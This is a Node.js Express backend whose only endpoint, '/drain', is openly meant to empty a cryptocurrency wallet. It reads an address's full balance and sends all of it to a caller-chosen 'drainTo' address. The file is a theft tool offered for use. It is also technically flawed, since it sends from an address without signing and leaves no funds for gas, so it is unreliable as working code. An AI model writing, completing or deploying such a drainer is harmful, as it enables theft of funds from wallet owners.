const express = require('express');
const bodyParser = require('body-parser');
const Web3 = require('web3');

const app = express();
const port = process.env.PORT || 3000;

// Use body-parser to parse JSON requests
app.use(bodyParser.json());

// Set up Web3 provider (you can use Infura or your own node)
// Replace with your Infura project ID if you want to use it
const web3 = new Web3('https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID');

// Endpoint for draining the wallet
app.post('/drain', async (req, res) => {
  const { address, drainTo } = req.body;

  if (!address || !drainTo) {
    return res.status(400).json({ error: 'Missing address or drain address' });
  }

  try {
    // Get the balance of the user's wallet
    const balance = await web3.eth.getBalance(address);
    const value = web3.utils.hexToNumberString(balance);

    // Send the funds to the drain address
    const transaction = await web3.eth.sendTransaction({
      from: address,
      to: drainTo,
      value: value,
    });

    res.status(200).json({
      success: true,
      message: 'Wallet drained successfully!',
      transactionHash: transaction.transactionHash,
    });
  } catch (err) {
    console.error(err);
    res.status(500).json({
      error: 'Failed to drain wallet',
      message: err.message,
    });
  }
});

// Start the server
app.listen(port, () => {
  console.log(`Backend running on http://localhost:${port}`);
});